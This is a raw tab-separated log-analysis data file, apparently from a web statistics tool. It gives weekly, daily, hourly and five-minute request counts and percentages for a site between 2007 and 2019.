W	Rr	2661	0.349	2008	05	04
W	Rr	3648	0.479	2008	04	27
W	Rr	1400	0.184	2008	04	20
W	Rr	1365	0.179	2008	04	13
W	Rr	1213	0.159	2008	04	06
W	Rr	1670	0.219	2008	03	30
W	Rr	1211	0.159	2008	03	23
W	Rr	1144	0.150	2008	03	16
W	Rr	1301	0.171	2008	03	09
W	Rr	1292	0.170	2008	03	02
W	Rr	1427	0.187	2008	02	24
W	Rr	2207	0.290	2008	02	17
W	Rr	1124	0.148	2008	02	10
W	Rr	1561	0.205	2008	02	03
W	Rr	1533	0.201	2008	01	27
W	Rr	1389	0.182	2008	01	20
W	Rr	1133	0.149	2008	01	13
W	Rr	1404	0.184	2008	01	06
W	Rr	976	0.128	2007	12	30
W	Rr	801	0.105	2007	12	23
W	Rr	675	0.089	2007	12	16
W	*BT	R	7060	2014	02	16
D	Rr	197	0.026	2019	03	22
D	Rr	287	0.038	2019	03	21
D	Rr	264	0.035	2019	03	20
D	Rr	226	0.030	2019	03	19
D	Rr	195	0.026	2019	03	18
D	Rr	295	0.039	2019	03	17
D	Rr	0	0.000	2019	03	16
D	Rr	254	0.033	2019	03	15
D	Rr	189	0.025	2019	03	14
D	Rr	251	0.033	2019	03	13
D	Rr	234	0.031	2019	03	12
D	Rr	235	0.031	2019	03	11
D	Rr	218	0.029	2019	03	10
D	Rr	0	0.000	2019	03	09
D	Rr	196	0.026	2019	03	08
D	Rr	191	0.025	2019	03	07
D	Rr	343	0.045	2019	03	06
D	Rr	285	0.037	2019	03	05
D	Rr	279	0.037	2019	03	04
D	Rr	333	0.044	2019	03	03
D	Rr	0	0.000	2019	03	02
D	Rr	347	0.046	2019	03	01
D	Rr	301	0.040	2019	02	28
D	Rr	122	0.016	2019	02	27
D	Rr	378	0.050	2019	02	26
D	Rr	335	0.044	2019	02	25
D	Rr	290	0.038	2019	02	24
D	Rr	0	0.000	2019	02	23
D	Rr	373	0.049	2019	02	22
D	Rr	249	0.033	2019	02	21
D	Rr	302	0.040	2019	02	20
D	Rr	327	0.043	2019	02	19
D	Rr	203	0.027	2019	02	18
D	Rr	215	0.028	2019	02	17
D	Rr	0	0.000	2019	02	16
D	Rr	230	0.030	2019	02	15
D	Rr	284	0.037	2019	02	14
D	Rr	240	0.032	2019	02	13
D	Rr	268	0.035	2019	02	12
D	Rr	259	0.034	2019	02	11
D	Rr	202	0.027	2019	02	10
D	Rr	0	0.000	2019	02	09
D	*BT	R	2131	2008	05	03
d	Rr	85227	11.191	Sun
d	Rr	119508	15.693	Mon
d	Rr	123158	16.172	Tue
d	Rr	120450	15.817	Wed
d	Rr	122003	16.021	Thu
d	Rr	114164	14.991	Fri
d	Rr	77024	10.114	Sat
H	Rr	4	0.001	2019	03	22	23
H	Rr	2	0.000	2019	03	22	22
H	Rr	3	0.000	2019	03	22	21
H	Rr	25	0.003	2019	03	22	20
H	Rr	4	0.001	2019	03	22	19
H	Rr	27	0.004	2019	03	22	18
H	Rr	7	0.001	2019	03	22	17
H	Rr	5	0.001	2019	03	22	16
H	Rr	25	0.003	2019	03	22	15
H	Rr	3	0.000	2019	03	22	14
H	Rr	22	0.003	2019	03	22	13
H	Rr	3	0.000	2019	03	22	12
H	Rr	3	0.000	2019	03	22	11
H	Rr	11	0.001	2019	03	22	10
H	Rr	7	0.001	2019	03	22	09
H	Rr	6	0.001	2019	03	22	08
H	Rr	0	0.000	2019	03	22	07
H	Rr	20	0.003	2019	03	22	06
H	Rr	1	0.000	2019	03	22	05
H	Rr	4	0.001	2019	03	22	04
H	Rr	3	0.000	2019	03	22	03
H	Rr	7	0.001	2019	03	22	02
H	Rr	3	0.000	2019	03	22	01
H	Rr	2	0.000	2019	03	22	00
H	Rr	1	0.000	2019	03	21	23
H	Rr	16	0.002	2019	03	21	22
H	Rr	64	0.008	2019	03	21	21
H	Rr	1	0.000	2019	03	21	20
H	Rr	8	0.001	2019	03	21	19
H	Rr	24	0.003	2019	03	21	18
H	Rr	17	0.002	2019	03	21	17
H	Rr	4	0.001	2019	03	21	16
H	Rr	8	0.001	2019	03	21	15
H	Rr	4	0.001	2019	03	21	14
H	Rr	2	0.000	2019	03	21	13
H	Rr	4	0.001	2019	03	21	12
H	Rr	1	0.000	2019	03	21	11
H	Rr	7	0.001	2019	03	21	10
H	Rr	2	0.000	2019	03	21	09
H	Rr	2	0.000	2019	03	21	08
H	Rr	6	0.001	2019	03	21	07
H	Rr	3	0.000	2019	03	21	06
H	Rr	35	0.005	2019	03	21	05
H	Rr	18	0.002	2019	03	21	04
H	Rr	37	0.005	2019	03	21	03
H	Rr	21	0.003	2019	03	21	02
H	Rr	0	0.000	2019	03	21	01
H	Rr	2	0.000	2019	03	21	00
H	Rr	3	0.000	2019	03	20	23
H	Rr	7	0.001	2019	03	20	22
H	Rr	13	0.002	2019	03	20	21
H	Rr	18	0.002	2019	03	20	20
H	Rr	5	0.001	2019	03	20	19
H	Rr	4	0.001	2019	03	20	18
H	Rr	2	0.000	2019	03	20	17
H	Rr	43	0.006	2019	03	20	16
H	Rr	2	0.000	2019	03	20	15
H	Rr	0	0.000	2019	03	20	14
H	Rr	41	0.005	2019	03	20	13
H	Rr	2	0.000	2019	03	20	12
H	Rr	22	0.003	2019	03	20	11
H	Rr	15	0.002	2019	03	20	10
H	Rr	5	0.001	2019	03	20	09
H	Rr	18	0.002	2019	03	20	08
H	Rr	26	0.003	2019	03	20	07
H	Rr	15	0.002	2019	03	20	06
H	Rr	9	0.001	2019	03	20	05
H	Rr	2	0.000	2019	03	20	04
H	Rr	2	0.000	2019	03	20	03
H	Rr	4	0.001	2019	03	20	02
H	Rr	6	0.001	2019	03	20	01
H	Rr	0	0.000	2019	03	20	00
H	*BT	R	634	2008	05	03	04
h	Rr	31243	4.103	00
h	Rr	29400	3.861	01
h	Rr	29264	3.843	02
h	Rr	28819	3.784	03
h	Rr	28686	3.767	04
h	Rr	27025	3.549	05
h	Rr	26247	3.447	06
h	Rr	25405	3.336	07
h	Rr	24874	3.266	08
h	Rr	23948	3.145	09
h	Rr	24173	3.174	10
h	Rr	25938	3.406	11
h	Rr	26899	3.532	12
h	Rr	28641	3.761	13
h	Rr	33144	4.352	14
h	Rr	37126	4.875	15
h	Rr	39837	5.231	16
h	Rr	39672	5.209	17
h	Rr	41352	5.430	18
h	Rr	41559	5.457	19
h	Rr	41160	5.405	20
h	Rr	38535	5.060	21
h	Rr	35838	4.706	22
h	Rr	32749	4.300	23
4	Rr	4	0.001	2019	03	22	23	15
4	Rr	0	0.000	2019	03	22	23	00
4	Rr	0	0.000	2019	03	22	22	45
4	Rr	0	0.000	2019	03	22	22	30
4	Rr	2	0.000	2019	03	22	22	15
4	Rr	0	0.000	2019	03	22	22	00
4	Rr	0	0.000	2019	03	22	21	45
4	Rr	1	0.000	2019	03	22	21	30
4	Rr	2	0.000	2019	03	22	21	15
4	Rr	0	0.000	2019	03	22	21	00
4	Rr	12	0.002	2019	03	22	20	45
4	Rr	3	0.000	2019	03	22	20	30
4	Rr	6	0.001	2019	03	22	20	15
4	Rr	4	0.001	2019	03	22	20	00
4	Rr	1	0.000	2019	03	22	19	45
4	Rr	1	0.000	2019	03	22	19	30
4	Rr	2	0.000	2019	03	22	19	15
4	Rr	0	0.000	2019	03	22	19	00
4	Rr	0	0.000	2019	03	22	18	45
4	Rr	1	0.000	2019	03	22	18	30
4	Rr	2	0.000	2019	03	22	18	15
4	Rr	24	0.003	2019	03	22	18	00
4	Rr	0	0.000	2019	03	22	17	45
4	Rr	2	0.000	2019	03	22	17	30
4	Rr	5	0.001	2019	03	22	17	15
4	Rr	0	0.000	2019	03	22	17	00
4	Rr	2	0.000	2019	03	22	16	45
4	Rr	1	0.000	2019	03	22	16	30
4	Rr	2	0.000	2019	03	22	16	15
4	Rr	0	0.000	2019	03	22	16	00
4	Rr	0	0.000	2019	03	22	15	45
4	Rr	24	0.003	2019	03	22	15	30
4	Rr	0	0.000	2019	03	22	15	15
4	Rr	1	0.000	2019	03	22	15	00
4	Rr	0	0.000	2019	03	22	14	45
4	Rr	0	0.000	2019	03	22	14	30
4	Rr	1	0.000	2019	03	22	14	15
4	Rr	2	0.000	2019	03	22	14	00
4	Rr	1	0.000	2019	03	22	13	45
4	Rr	4	0.001	2019	03	22	13	30
4	Rr	17	0.002	2019	03	22	13	15
4	Rr	0	0.000	2019	03	22	13	00
4	Rr	0	0.000	2019	03	22	12	45
4	Rr	0	0.000	2019	03	22	12	30
4	Rr	1	0.000	2019	03	22	12	15
4	Rr	2	0.000	2019	03	22	12	00
4	Rr	0	0.000	2019	03	22	11	45
4	Rr	2	0.000	2019	03	22	11	30
4	Rr	1	0.000	2019	03	22	11	15
4	Rr	0	0.000	2019	03	22	11	00
4	Rr	1	0.000	2019	03	22	10	45
4	Rr	10	0.001	2019	03	22	10	30
4	Rr	0	0.000	2019	03	22	10	15
4	Rr	0	0.000	2019	03	22	10	00
4	Rr	4	0.001	2019	03	22	09	45
4	Rr	3	0.000	2019	03	22	09	30
4	Rr	0	0.000	2019	03	22	09	15
4	Rr	0	0.000	2019	03	22	09	00
4	Rr	0	0.000	2019	03	22	08	45
4	Rr	0	0.000	2019	03	22	08	30
4	Rr	0	0.000	2019	03	22	08	15
4	Rr	6	0.001	2019	03	22	08	00
4	Rr	0	0.000	2019	03	22	07	45
4	Rr	0	0.000	2019	03	22	07	30
4	Rr	0	0.000	2019	03	22	07	15
4	Rr	0	0.000	2019	03	22	07	00
4	Rr	0	0.000	2019	03	22	06	45
4	Rr	14	0.002	2019	03	22	06	30
4	Rr	6	0.001	2019	03	22	06	15
4	Rr	0	0.000	2019	03	22	06	00
4	Rr	0	0.000	2019	03	22	05	45
4	Rr	0	0.000	2019	03	22	05	30
4	Rr	0	0.000	2019	03	22	05	15
4	Rr	1	0.000	2019	03	22	05	00
4	Rr	0	0.000	2019	03	22	04	45
4	Rr	0	0.000	2019	03	22	04	30
4	Rr	3	0.000	2019	03	22	04	15
4	Rr	1	0.000	2019	03	22	04	00
4	Rr	1	0.000	2019	03	22	03	45
4	Rr	1	0.000	2019	03	22	03	30
4	Rr	0	0.000	2019	03	22	03	15
4	Rr	1	0.000	2019	03	22	03	00
4	Rr	6	0.001	2019	03	22	02	45
4	Rr	0	0.000	2019	03	22	02	30
4	Rr	0	0.000	2019	03	22	02	15
4	Rr	1	0.000	2019	03	22	02	00
4	Rr	2	0.000	2019	03	22	01	45
4	Rr	0	0.000	2019	03	22	01	30
4	Rr	1	0.000	2019	03	22	01	15
4	Rr	0	0.000	2019	03	22	01	00
4	Rr	2	0.000	2019	03	22	00	45
4	Rr	0	0.000	2019	03	22	00	30
4	Rr	0	0.000	2019	03	22	00	15
4	Rr	0	0.000	2019	03	22	00	00
4	Rr	1	0.000	2019	03	21	23	45
4	Rr	0	0.000	2019	03	21	23	30
4	*BT	R	398	2008	05	03	03	30
6	Rr	7727	1.015	00	00
6	Rr	7828	1.028	00	15
6	Rr	7678	1.008	00	30
6	Rr	8010	1.052	00	45
6	Rr	7442	0.977	01	00
6	Rr	7342	0.964	01	15
6	Rr	7342	0.964	01	30
6	Rr	7274	0.955	01	45
6	Rr	7010	0.921	02	00
6	Rr	7833	1.029	02	15
6	Rr	7509	0.986	02	30
6	Rr	6912	0.908	02	45
6	Rr	7147	0.939	03	00
6	Rr	6811	0.894	03	15
6	Rr	7259	0.953	03	30
6	Rr	7602	0.998	03	45
6	Rr	7124	0.935	04	00
6	Rr	7506	0.986	04	15
6	Rr	6691	0.879	04	30
6	Rr	7365	0.967	04	45
6	Rr	6518	0.856	05	00
6	Rr	7096	0.932	05	15
6	Rr	7045	0.925	05	30
6	Rr	6366	0.836	05	45
6	Rr	6777	0.890	06	00
6	Rr	6781	0.890	06	15
6	Rr	6372	0.837	06	30
6	Rr	6317	0.830	06	45
6	Rr	6482	0.851	07	00
6	Rr	6537	0.858	07	15
6	Rr	6573	0.863	07	30
6	Rr	5813	0.763	07	45
6	Rr	6380	0.838	08	00
6	Rr	6044	0.794	08	15
6	Rr	6609	0.868	08	30
6	Rr	5841	0.767	08	45
6	Rr	6030	0.792	09	00
6	Rr	6131	0.805	09	15
6	Rr	6145	0.807	09	30
6	Rr	5642	0.741	09	45
6	Rr	5764	0.757	10	00
6	Rr	5885	0.773	10	15
6	Rr	6177	0.811	10	30
6	Rr	6347	0.833	10	45
6	Rr	7589	0.997	11	00
6	Rr	6132	0.805	11	15
6	Rr	5938	0.780	11	30
6	Rr	6279	0.825	11	45
6	Rr	7433	0.976	12	00
6	Rr	6108	0.802	12	15
6	Rr	6495	0.853	12	30
6	Rr	6863	0.901	12	45
6	Rr	7298	0.958	13	00
6	Rr	6817	0.895	13	15
6	Rr	7587	0.996	13	30
6	Rr	6939	0.911	13	45
6	Rr	8077	1.061	14	00
6	Rr	8256	1.084	14	15
6	Rr	8414	1.105	14	30
6	Rr	8397	1.103	14	45
6	Rr	9097	1.195	15	00
6	Rr	8922	1.172	15	15
6	Rr	9178	1.205	15	30
6	Rr	9929	1.304	15	45
6	Rr	9754	1.281	16	00
6	Rr	9672	1.270	16	15
6	Rr	10080	1.324	16	30
6	Rr	10331	1.357	16	45
6	Rr	9749	1.280	17	00
6	Rr	9961	1.308	17	15
6	Rr	9950	1.307	17	30
6	Rr	10012	1.315	17	45
6	Rr	9674	1.270	18	00
6	Rr	10467	1.374	18	15
6	Rr	10821	1.421	18	30
6	Rr	10390	1.364	18	45
6	Rr	11454	1.504	19	00
6	Rr	9580	1.258	19	15
6	Rr	10325	1.356	19	30
6	Rr	10200	1.339	19	45
6	Rr	10990	1.443	20	00
6	Rr	10108	1.327	20	15
6	Rr	9672	1.270	20	30
6	Rr	10390	1.364	20	45
6	Rr	10063	1.321	21	00
6	Rr	9406	1.235	21	15
6	Rr	9467	1.243	21	30
6	Rr	9599	1.260	21	45
6	Rr	9179	1.205	22	00
6	Rr	9134	1.199	22	15
6	Rr	8915	1.171	22	30
6	Rr	8610	1.131	22	45
6	Rr	9091	1.194	23	00
6	Rr	8326	1.093	23	15
6	Rr	7803	1.025	23	30
6	Rr	7529	0.989	23	45
5	Rr	1	0.000	2019	03	22	23	25
5	Rr	0	0.000	2019	03	22	23	20
5	Rr	3	0.000	2019	03	22	23	15
5	Rr	0	0.000	2019	03	22	23	10
5	Rr	0	0.000	2019	03	22	23	05
5	Rr	0	0.000	2019	03	22	23	00
5	Rr	0	0.000	2019	03	22	22	55
5	Rr	0	0.000	2019	03	22	22	50
5	Rr	0	0.000	2019	03	22	22	45
5	Rr	0	0.000	2019	03	22	22	40
5	Rr	0	0.000	2019	03	22	22	35
5	Rr	0	0.000	2019	03	22	22	30
5	Rr	0	0.000	2019	03	22	22	25
5	Rr	1	0.000	2019	03	22	22	20
5	Rr	1	0.000	2019	03	22	22	15
5	Rr	0	0.000	2019	03	22	22	10
5	Rr	0	0.000	2019	03	22	22	05
5	Rr	0	0.000	2019	03	22	22	00
5	Rr	0	0.000	2019	03	22	21	55
5	Rr	0	0.000	2019	03	22	21	50
5	Rr	0	0.000	2019	03	22	21	45
5	Rr	0	0.000	2019	03	22	21	40
5	Rr	0	0.000	2019	03	22	21	35
5	Rr	1	0.000	2019	03	22	21	30
5	Rr	2	0.000	2019	03	22	21	25
5	Rr	0	0.000	2019	03	22	21	20
5	Rr	0	0.000	2019	03	22	21	15
5	Rr	0	0.000	2019	03	22	21	10
5	Rr	0	0.000	2019	03	22	21	05
5	Rr	0	0.000	2019	03	22	21	00
5	Rr	0	0.000	2019	03	22	20	55
5	Rr	0	0.000	2019	03	22	20	50
5	Rr	12	0.002	2019	03	22	20	45
5	Rr	3	0.000	2019	03	22	20	40
5	Rr	0	0.000	2019	03	22	20	35
5	Rr	0	0.000	2019	03	22	20	30
5	Rr	6	0.001	2019	03	22	20	25
5	Rr	0	0.000	2019	03	22	20	20
5	Rr	0	0.000	2019	03	22	20	15
5	Rr	0	0.000	2019	03	22	20	10
5	Rr	4	0.001	2019	03	22	20	05
5	Rr	0	0.000	2019	03	22	20	00
5	Rr	0	0.000	2019	03	22	19	55
5	Rr	1	0.000	2019	03	22	19	50
5	Rr	0	0.000	2019	03	22	19	45
5	Rr	0	0.000	2019	03	22	19	40
5	Rr	1	0.000	2019	03	22	19	35
5	Rr	0	0.000	2019	03	22	19	30
5	Rr	1	0.000	2019	03	22	19	25
5	Rr	0	0.000	2019	03	22	19	20
5	Rr	1	0.000	2019	03	22	19	15
5	Rr	0	0.000	2019	03	22	19	10
5	Rr	0	0.000	2019	03	22	19	05
5	Rr	0	0.000	2019	03	22	19	00
5	Rr	0	0.000	2019	03	22	18	55
5	Rr	0	0.000	2019	03	22	18	50
5	Rr	0	0.000	2019	03	22	18	45
5	Rr	0	0.000	2019	03	22	18	40
5	Rr	0	0.000	2019	03	22	18	35
5	Rr	1	0.000	2019	03	22	18	30
5	Rr	0	0.000	2019	03	22	18	25
5	Rr	1	0.000	2019	03	22	18	20
5	Rr	1	0.000	2019	03	22	18	15
5	Rr	0	0.000	2019	03	22	18	10
5	Rr	24	0.003	2019	03	22	18	05
5	Rr	0	0.000	2019	03	22	18	00
5	Rr	0	0.000	2019	03	22	17	55
5	Rr	0	0.000	2019	03	22	17	50
5	Rr	0	0.000	2019	03	22	17	45
5	Rr	1	0.000	2019	03	22	17	40
5	Rr	0	0.000	2019	03	22	17	35
5	Rr	1	0.000	2019	03	22	17	30
5	Rr	3	0.000	2019	03	22	17	25
5	Rr	1	0.000	2019	03	22	17	20
5	Rr	1	0.000	2019	03	22	17	15
5	Rr	0	0.000	2019	03	22	17	10
5	Rr	0	0.000	2019	03	22	17	05
5	Rr	0	0.000	2019	03	22	17	00
5	Rr	0	0.000	2019	03	22	16	55
5	Rr	1	0.000	2019	03	22	16	50
5	Rr	1	0.000	2019	03	22	16	45
5	Rr	1	0.000	2019	03	22	16	40
5	Rr	0	0.000	2019	03	22	16	35
5	Rr	0	0.000	2019	03	22	16	30
5	Rr	1	0.000	2019	03	22	16	25
5	Rr	0	0.000	2019	03	22	16	20
5	Rr	1	0.000	2019	03	22	16	15
5	Rr	0	0.000	2019	03	22	16	10
5	Rr	0	0.000	2019	03	22	16	05
5	Rr	0	0.000	2019	03	22	16	00
5	Rr	0	0.000	2019	03	22	15	55
5	Rr	0	0.000	2019	03	22	15	50
5	Rr	0	0.000	2019	03	22	15	45
5	Rr	4	0.001	2019	03	22	15	40
5	Rr	20	0.003	2019	03	22	15	35
5	Rr	0	0.000	2019	03	22	15	30
5	Rr	0	0.000	2019	03	22	15	25
5	Rr	0	0.000	2019	03	22	15	20
5	Rr	0	0.000	2019	03	22	15	15
5	Rr	1	0.000	2019	03	22	15	10
5	Rr	0	0.000	2019	03	22	15	05
5	Rr	0	0.000	2019	03	22	15	00
5	Rr	0	0.000	2019	03	22	14	55
5	Rr	0	0.000	2019	03	22	14	50
5	Rr	0	0.000	2019	03	22	14	45
5	Rr	0	0.000	2019	03	22	14	40
5	Rr	0	0.000	2019	03	22	14	35
5	Rr	0	0.000	2019	03	22	14	30
5	Rr	1	0.000	2019	03	22	14	25
5	Rr	0	0.000	2019	03	22	14	20
5	Rr	0	0.000	2019	03	22	14	15
5	Rr	2	0.000	2019	03	22	14	10
5	Rr	0	0.000	2019	03	22	14	05
5	Rr	0	0.000	2019	03	22	14	00
5	Rr	0	0.000	2019	03	22	13	55
5	Rr	0	0.000	2019	03	22	13	50
5	Rr	1	0.000	2019	03	22	13	45
5	Rr	3	0.000	2019	03	22	13	40
5	Rr	1	0.000	2019	03	22	13	35
5	Rr	0	0.000	2019	03	22	13	30
5	Rr	3	0.000	2019	03	22	13	25
5	Rr	13	0.002	2019	03	22	13	20
5	Rr	1	0.000	2019	03	22	13	15
5	Rr	0	0.000	2019	03	22	13	10
5	Rr	0	0.000	2019	03	22	13	05
5	Rr	0	0.000	2019	03	22	13	00
5	Rr	0	0.000	2019	03	22	12	55
5	Rr	0	0.000	2019	03	22	12	50
5	Rr	0	0.000	2019	03	22	12	45
5	Rr	0	0.000	2019	03	22	12	40
5	Rr	0	0.000	2019	03	22	12	35
5	Rr	0	0.000	2019	03	22	12	30
5	Rr	0	0.000	2019	03	22	12	25
5	Rr	1	0.000	2019	03	22	12	20
5	Rr	0	0.000	2019	03	22	12	15
5	Rr	1	0.000	2019	03	22	12	10
5	Rr	0	0.000	2019	03	22	12	05
5	Rr	1	0.000	2019	03	22	12	00
5	Rr	0	0.000	2019	03	22	11	55
5	Rr	0	0.000	2019	03	22	11	50
5	Rr	0	0.000	2019	03	22	11	45
5	Rr	0	0.000	2019	03	22	11	40
5	Rr	0	0.000	2019	03	22	11	35
5	Rr	2	0.000	2019	03	22	11	30
5	Rr	1	0.000	2019	03	22	11	25
5	Rr	0	0.000	2019	03	22	11	20
5	Rr	0	0.000	2019	03	22	11	15
5	Rr	0	0.000	2019	03	22	11	10
5	Rr	0	0.000	2019	03	22	11	05
5	Rr	0	0.000	2019	03	22	11	00
5	Rr	0	0.000	2019	03	22	10	55
5	Rr	1	0.000	2019	03	22	10	50
5	Rr	0	0.000	2019	03	22	10	45
5	Rr	6	0.001	2019	03	22	10	40
5	Rr	4	0.001	2019	03	22	10	35
5	Rr	0	0.000	2019	03	22	10	30
5	Rr	0	0.000	2019	03	22	10	25
5	Rr	0	0.000	2019	03	22	10	20
5	Rr	0	0.000	2019	03	22	10	15
5	Rr	0	0.000	2019	03	22	10	10
5	Rr	0	0.000	2019	03	22	10	05
5	Rr	0	0.000	2019	03	22	10	00
5	Rr	0	0.000	2019	03	22	09	55
5	Rr	0	0.000	2019	03	22	09	50
5	Rr	4	0.001	2019	03	22	09	45
5	Rr	0	0.000	2019	03	22	09	40
5	Rr	3	0.000	2019	03	22	09	35
5	Rr	0	0.000	2019	03	22	09	30
5	Rr	0	0.000	2019	03	22	09	25
5	Rr	0	0.000	2019	03	22	09	20
5	Rr	0	0.000	2019	03	22	09	15
5	Rr	0	0.000	2019	03	22	09	10
5	Rr	0	0.000	2019	03	22	09	05
5	Rr	0	0.000	2019	03	22	09	00
5	Rr	0	0.000	2019	03	22	08	55
5	Rr	0	0.000	2019	03	22	08	50
5	Rr	0	0.000	2019	03	22	08	45
5	Rr	0	0.000	2019	03	22	08	40
5	Rr	0	0.000	2019	03	22	08	35
5	Rr	0	0.000	2019	03	22	08	30
5	Rr	0	0.000	2019	03	22	08	25
5	Rr	0	0.000	2019	03	22	08	20
5	Rr	0	0.000	2019	03	22	08	15
5	Rr	0	0.000	2019	03	22	08	10
5	Rr	3	0.000	2019	03	22	08	05
5	Rr	3	0.000	2019	03	22	08	00
5	Rr	0	0.000	2019	03	22	07	55
5	Rr	0	0.000	2019	03	22	07	50
5	Rr	0	0.000	2019	03	22	07	45
5	Rr	0	0.000	2019	03	22	07	40
5	Rr	0	0.000	2019	03	22	07	35
5	Rr	0	0.000	2019	03	22	07	30
5	Rr	0	0.000	2019	03	22	07	25
5	Rr	0	0.000	2019	03	22	07	20
5	Rr	0	0.000	2019	03	22	07	15
5	Rr	0	0.000	2019	03	22	07	10
5	Rr	0	0.000	2019	03	22	07	05
5	Rr	0	0.000	2019	03	22	07	00
5	Rr	0	0.000	2019	03	22	06	55
5	Rr	0	0.000	2019	03	22	06	50
5	Rr	0	0.000	2019	03	22	06	45
5	Rr	0	0.000	2019	03	22	06	40
5	Rr	0	0.000	2019	03	22	06	35
5	Rr	14	0.002	2019	03	22	06	30
5	Rr	5	0.001	2019	03	22	06	25
5	Rr	0	0.000	2019	03	22	06	20
5	Rr	1	0.000	2019	03	22	06	15
5	Rr	0	0.000	2019	03	22	06	10
5	Rr	0	0.000	2019	03	22	06	05
5	Rr	0	0.000	2019	03	22	06	00
5	Rr	0	0.000	2019	03	22	05	55
5	Rr	0	0.000	2019	03	22	05	50
5	Rr	0	0.000	2019	03	22	05	45
5	Rr	0	0.000	2019	03	22	05	40
5	Rr	0	0.000	2019	03	22	05	35
5	Rr	0	0.000	2019	03	22	05	30
5	Rr	0	0.000	2019	03	22	05	25
5	Rr	0	0.000	2019	03	22	05	20
5	Rr	0	0.000	2019	03	22	05	15
5	Rr	0	0.000	2019	03	22	05	10
5	Rr	1	0.000	2019	03	22	05	05
5	Rr	0	0.000	2019	03	22	05	00
5	Rr	0	0.000	2019	03	22	04	55
5	Rr	0	0.000	2019	03	22	04	50
5	Rr	0	0.000	2019	03	22	04	45
5	Rr	0	0.000	2019	03	22	04	40
5	Rr	0	0.000	2019	03	22	04	35
5	Rr	0	0.000	2019	03	22	04	30
5	Rr	1	0.000	2019	03	22	04	25
5	Rr	0	0.000	2019	03	22	04	20
5	Rr	2	0.000	2019	03	22	04	15
5	Rr	0	0.000	2019	03	22	04	10
5	Rr	1	0.000	2019	03	22	04	05
5	Rr	0	0.000	2019	03	22	04	00
5	Rr	0	0.000	2019	03	22	03	55
5	Rr	1	0.000	2019	03	22	03	50
5	Rr	0	0.000	2019	03	22	03	45
5	Rr	0	0.000	2019	03	22	03	40
5	Rr	0	0.000	2019	03	22	03	35
5	Rr	1	0.000	2019	03	22	03	30
5	Rr	0	0.000	2019	03	22	03	25
5	Rr	0	0.000	2019	03	22	03	20
5	Rr	0	0.000	2019	03	22	03	15
5	Rr	0	0.000	2019	03	22	03	10
5	Rr	1	0.000	2019	03	22	03	05
5	Rr	0	0.000	2019	03	22	03	00
5	Rr	3	0.000	2019	03	22	02	55
5	Rr	0	0.000	2019	03	22	02	50
5	Rr	3	0.000	2019	03	22	02	45
5	Rr	0	0.000	2019	03	22	02	40
5	Rr	0	0.000	2019	03	22	02	35
5	Rr	0	0.000	2019	03	22	02	30
5	Rr	0	0.000	2019	03	22	02	25
5	Rr	0	0.000	2019	03	22	02	20
5	Rr	0	0.000	2019	03	22	02	15
5	Rr	1	0.000	2019	03	22	02	10
5	Rr	0	0.000	2019	03	22	02	05
5	Rr	0	0.000	2019	03	22	02	00
5	Rr	1	0.000	2019	03	22	01	55
5	Rr	1	0.000	2019	03	22	01	50
5	Rr	0	0.000	2019	03	22	01	45
5	Rr	0	0.000	2019	03	22	01	40
5	Rr	0	0.000	2019	03	22	01	35
5	Rr	0	0.000	2019	03	22	01	30
5	Rr	0	0.000	2019	03	22	01	25
5	Rr	1	0.000	2019	03	22	01	20
5	Rr	0	0.000	2019	03	22	01	15
5	Rr	0	0.000	2019	03	22	01	10
5	Rr	0	0.000	2019	03	22	01	05
5	Rr	0	0.000	2019	03	22	01	00
5	Rr	0	0.000	2019	03	22	00	55
5	Rr	2	0.000	2019	03	22	00	50
5	Rr	0	0.000	2019	03	22	00	45
5	Rr	0	0.000	2019	03	22	00	40
5	Rr	0	0.000	2019	03	22	00	35
5	Rr	0	0.000	2019	03	22	00	30
5	Rr	0	0.000	2019	03	22	00	25
5	Rr	0	0.000	2019	03	22	00	20
5	Rr	0	0.000	2019	03	22	00	15
5	Rr	0	0.000	2019	03	22	00	10
5	Rr	0	0.000	2019	03	22	00	05
5	Rr	0	0.000	2019	03	22	00	00
5	Rr	0	0.000	2019	03	21	23	55
5	Rr	1	0.000	2019	03	21	23	50
5	Rr	0	0.000	2019	03	21	23	45
5	Rr	0	0.000	2019	03	21	23	40
5	Rr	0	0.000	2019	03	21	23	35
5	Rr	0	0.000	2019	03	21	23	30
5	*BT	R	252	2009	11	23	07	25
7	Rr	2423	0.318	00	00
7	Rr	2804	0.368	00	05
7	Rr	2500	0.328	00	10
7	Rr	2204	0.289	00	15
7	Rr	2674	0.351	00	20
7	Rr	2950	0.387	00	25
7	Rr	2497	0.328	00	30
7	Rr	2617	0.344	00	35
7	Rr	2564	0.337	00	40
7	Rr	2672	0.351	00	45
7	Rr	2977	0.391	00	50
7	Rr	2361	0.310	00	55
7	Rr	2281	0.300	01	00
7	Rr	2495	0.328	01	05
7	Rr	2666	0.350	01	10
7	Rr	2413	0.317	01	15
7	Rr	2637	0.346	01	20
7	Rr	2292	0.301	01	25
7	Rr	2377	0.312	01	30
7	Rr	2523	0.331	01	35
7	Rr	2442	0.321	01	40
7	Rr	2339	0.307	01	45
7	Rr	2279	0.299	01	50
7	Rr	2656	0.349	01	55
7	Rr	2262	0.297	02	00
7	Rr	2407	0.316	02	05
7	Rr	2341	0.307	02	10
7	Rr	2877	0.378	02	15
7	Rr	2385	0.313	02	20
7	Rr	2571	0.338	02	25
7	Rr	2426	0.319	02	30
7	Rr	2712	0.356	02	35
7	Rr	2371	0.311	02	40
7	Rr	2375	0.312	02	45
7	Rr	2111	0.277	02	50
7	Rr	2426	0.319	02	55
7	Rr	2382	0.313	03	00
7	Rr	2449	0.322	03	05
7	Rr	2316	0.304	03	10
7	Rr	2393	0.314	03	15
7	Rr	2240	0.294	03	20
7	Rr	2178	0.286	03	25
7	Rr	2355	0.309	03	30
7	Rr	2396	0.315	03	35
7	Rr	2508	0.329	03	40
7	Rr	2705	0.355	03	45
7	Rr	2467	0.324	03	50
7	Rr	2430	0.319	03	55
7	Rr	2320	0.305	04	00
7	Rr	2284	0.300	04	05
7	Rr	2520	0.331	04	10
7	Rr	2608	0.342	04	15
7	Rr	2569	0.337	04	20
7	Rr	2329	0.306	04	25
7	Rr	2398	0.315	04	30
7	Rr	2107	0.277	04	35
7	Rr	2186	0.287	04	40
7	Rr	2837	0.373	04	45
7	Rr	2173	0.285	04	50
7	Rr	2355	0.309	04	55
7	Rr	2025	0.266	05	00
7	Rr	2006	0.263	05	05
7	Rr	2487	0.327	05	10
7	Rr	2307	0.303	05	15
7	Rr	2465	0.324	05	20
7	Rr	2324	0.305	05	25
7	Rr	2511	0.330	05	30
7	Rr	2450	0.322	05	35
7	Rr	2084	0.274	05	40
7	Rr	2146	0.282	05	45
7	Rr	2110	0.277	05	50
7	Rr	2110	0.277	05	55
